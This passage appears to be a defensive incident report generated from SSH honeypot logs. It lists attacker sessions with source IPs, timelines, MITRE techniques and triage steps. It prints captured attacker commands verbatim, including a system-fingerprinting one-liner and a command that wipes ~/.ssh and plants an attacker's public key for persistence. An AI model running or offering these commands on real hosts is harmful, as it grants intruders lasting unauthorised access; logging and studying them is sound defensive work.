- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c817c25bc5f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:31 |
| **Last Seen** | 2026-07-09 12:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:31:17` | `cowrie.session.connect` |
| `2026-07-09 12:31:17` | `cowrie.client.version` |
| `2026-07-09 12:31:17` | `cowrie.client.kex` |
| `2026-07-09 12:31:20` | `cowrie.login.success` |
| `2026-07-09 12:31:22` | `cowrie.session.params` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.success` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:22` | `cowrie.command.input` |
| `2026-07-09 12:31:23` | `cowrie.log.closed` |
| `2026-07-09 12:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea0fda0accd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 12:31 |
| **Last Seen** | 2026-07-09 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:31:28` | `cowrie.session.connect` |
| `2026-07-09 12:31:28` | `cowrie.client.version` |
| `2026-07-09 12:31:29` | `cowrie.client.kex` |
| `2026-07-09 12:31:29` | `cowrie.login.success` |
| `2026-07-09 12:31:30` | `cowrie.session.params` |
| `2026-07-09 12:31:30` | `cowrie.command.input` |
| `2026-07-09 12:31:31` | `cowrie.log.closed` |
| `2026-07-09 12:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054cc62fe20c

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-07-09 12:32 |
| **Last Seen** | 2026-07-09 12:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:32:35` | `cowrie.session.connect` |
| `2026-07-09 12:32:35` | `cowrie.client.version` |
| `2026-07-09 12:32:35` | `cowrie.client.kex` |
| `2026-07-09 12:32:37` | `cowrie.login.success` |
| `2026-07-09 12:32:37` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0286292e243

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:33 |
| **Last Seen** | 2026-07-09 12:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:33:28` | `cowrie.session.connect` |
| `2026-07-09 12:33:29` | `cowrie.client.version` |
| `2026-07-09 12:33:29` | `cowrie.client.kex` |
| `2026-07-09 12:33:32` | `cowrie.login.success` |
| `2026-07-09 12:33:34` | `cowrie.session.params` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.success` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.command.input` |
| `2026-07-09 12:33:34` | `cowrie.log.closed` |
| `2026-07-09 12:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02499012050a

| Field | Detail |
|---|---|
| **Source IP** | `157.7.200[.]152` |
| **First Seen** | 2026-07-09 12:34 |
| **Last Seen** | 2026-07-09 12:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:34:13` | `cowrie.session.connect` |
| `2026-07-09 12:34:14` | `cowrie.client.version` |
| `2026-07-09 12:34:14` | `cowrie.client.kex` |
| `2026-07-09 12:34:16` | `cowrie.login.success` |
| `2026-07-09 12:34:17` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.7.200[.]152` to AbuseIPDB if not already reported
- [ ] Block `157.7.200[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14fe31dceb4b

| Field | Detail |
|---|---|
| **Source IP** | `218.155.106[.]83` |
| **First Seen** | 2026-07-09 12:34 |
| **Last Seen** | 2026-07-09 12:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:34:22` | `cowrie.session.connect` |
| `2026-07-09 12:34:23` | `cowrie.client.version` |
| `2026-07-09 12:34:23` | `cowrie.client.kex` |
| `2026-07-09 12:34:25` | `cowrie.login.success` |
| `2026-07-09 12:34:26` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.155.106[.]83` to AbuseIPDB if not already reported
- [ ] Block `218.155.106[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf5e1be7280

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:35 |
| **Last Seen** | 2026-07-09 12:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:35:44` | `cowrie.session.connect` |
| `2026-07-09 12:35:45` | `cowrie.client.version` |
| `2026-07-09 12:35:45` | `cowrie.client.kex` |
| `2026-07-09 12:35:47` | `cowrie.login.success` |
| `2026-07-09 12:35:49` | `cowrie.session.params` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.success` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:49` | `cowrie.command.input` |
| `2026-07-09 12:35:50` | `cowrie.log.closed` |
| `2026-07-09 12:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f44d47b6af3

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-09 12:37 |
| **Last Seen** | 2026-07-09 12:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:37:47` | `cowrie.session.connect` |
| `2026-07-09 12:37:48` | `cowrie.client.version` |
| `2026-07-09 12:37:48` | `cowrie.client.kex` |
| `2026-07-09 12:37:50` | `cowrie.login.success` |
| `2026-07-09 12:37:50` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e89c7d277a97

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:37 |
| **Last Seen** | 2026-07-09 12:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:37:59` | `cowrie.session.connect` |
| `2026-07-09 12:38:01` | `cowrie.client.version` |
| `2026-07-09 12:38:01` | `cowrie.client.kex` |
| `2026-07-09 12:38:02` | `cowrie.login.success` |
| `2026-07-09 12:38:04` | `cowrie.session.params` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.success` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.command.input` |
| `2026-07-09 12:38:04` | `cowrie.log.closed` |
| `2026-07-09 12:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f36fc2b3ea7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:40 |
| **Last Seen** | 2026-07-09 12:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:40:16` | `cowrie.session.connect` |
| `2026-07-09 12:40:17` | `cowrie.client.version` |
| `2026-07-09 12:40:17` | `cowrie.client.kex` |
| `2026-07-09 12:40:19` | `cowrie.login.success` |
| `2026-07-09 12:40:20` | `cowrie.session.params` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.success` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:20` | `cowrie.command.input` |
| `2026-07-09 12:40:21` | `cowrie.log.closed` |
| `2026-07-09 12:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24505724aa31

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-07-09 12:41 |
| **Last Seen** | 2026-07-09 12:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:41:18` | `cowrie.session.connect` |
| `2026-07-09 12:41:18` | `cowrie.client.version` |
| `2026-07-09 12:41:18` | `cowrie.client.kex` |
| `2026-07-09 12:41:20` | `cowrie.login.success` |
| `2026-07-09 12:41:20` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2555a5f394a

| Field | Detail |
|---|---|
| **Source IP** | `185.225.41[.]192` |
| **First Seen** | 2026-07-09 12:41 |
| **Last Seen** | 2026-07-09 12:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:41:47` | `cowrie.session.connect` |
| `2026-07-09 12:41:47` | `cowrie.client.version` |
| `2026-07-09 12:41:47` | `cowrie.client.kex` |
| `2026-07-09 12:41:48` | `cowrie.login.success` |
| `2026-07-09 12:41:49` | `cowrie.session.params` |
| `2026-07-09 12:41:49` | `cowrie.command.input` |
| `2026-07-09 12:41:49` | `cowrie.command.failed` |
| `2026-07-09 12:41:49` | `cowrie.log.closed` |
| `2026-07-09 12:41:50` | `cowrie.session.params` |
| `2026-07-09 12:41:50` | `cowrie.command.input` |
| `2026-07-09 12:41:50` | `cowrie.session.file_download` |
| `2026-07-09 12:41:50` | `cowrie.log.closed` |
| `2026-07-09 12:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.225.41[.]192` to AbuseIPDB if not already reported
- [ ] Block `185.225.41[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7befeb77fe7

| Field | Detail |
|---|---|
| **Source IP** | `185.225.41[.]192` |
| **First Seen** | 2026-07-09 12:41 |
| **Last Seen** | 2026-07-09 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:41:50` | `cowrie.session.connect` |
| `2026-07-09 12:41:50` | `cowrie.client.version` |
| `2026-07-09 12:41:50` | `cowrie.client.kex` |
| `2026-07-09 12:41:51` | `cowrie.login.success` |
| `2026-07-09 12:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.225.41[.]192` to AbuseIPDB if not already reported
- [ ] Block `185.225.41[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21381a398764

| Field | Detail |
|---|---|
| **Source IP** | `185.225.41[.]192` |
| **First Seen** | 2026-07-09 12:41 |
| **Last Seen** | 2026-07-09 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:41:52` | `cowrie.session.connect` |
| `2026-07-09 12:41:52` | `cowrie.client.version` |
| `2026-07-09 12:41:52` | `cowrie.client.kex` |
| `2026-07-09 12:41:53` | `cowrie.login.success` |
| `2026-07-09 12:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.225.41[.]192` to AbuseIPDB if not already reported
- [ ] Block `185.225.41[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4dbe97b4792

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 12:42 |
| **Last Seen** | 2026-07-09 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:42:04` | `cowrie.session.connect` |
| `2026-07-09 12:42:04` | `cowrie.client.version` |
| `2026-07-09 12:42:04` | `cowrie.client.kex` |
| `2026-07-09 12:42:04` | `cowrie.login.success` |
| `2026-07-09 12:42:05` | `cowrie.session.params` |
| `2026-07-09 12:42:05` | `cowrie.command.input` |
| `2026-07-09 12:42:05` | `cowrie.log.closed` |
| `2026-07-09 12:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7181a258f027

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:42 |
| **Last Seen** | 2026-07-09 12:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:42:31` | `cowrie.session.connect` |
| `2026-07-09 12:42:32` | `cowrie.client.version` |
| `2026-07-09 12:42:32` | `cowrie.client.kex` |
| `2026-07-09 12:42:33` | `cowrie.login.success` |
| `2026-07-09 12:42:35` | `cowrie.session.params` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.success` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:35` | `cowrie.command.input` |
| `2026-07-09 12:42:36` | `cowrie.log.closed` |
| `2026-07-09 12:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24721894b429

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:44 |
| **Last Seen** | 2026-07-09 12:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:44:48` | `cowrie.session.connect` |
| `2026-07-09 12:44:49` | `cowrie.client.version` |
| `2026-07-09 12:44:49` | `cowrie.client.kex` |
| `2026-07-09 12:44:51` | `cowrie.login.success` |
| `2026-07-09 12:44:52` | `cowrie.session.params` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.success` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:52` | `cowrie.command.input` |
| `2026-07-09 12:44:53` | `cowrie.log.closed` |
| `2026-07-09 12:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
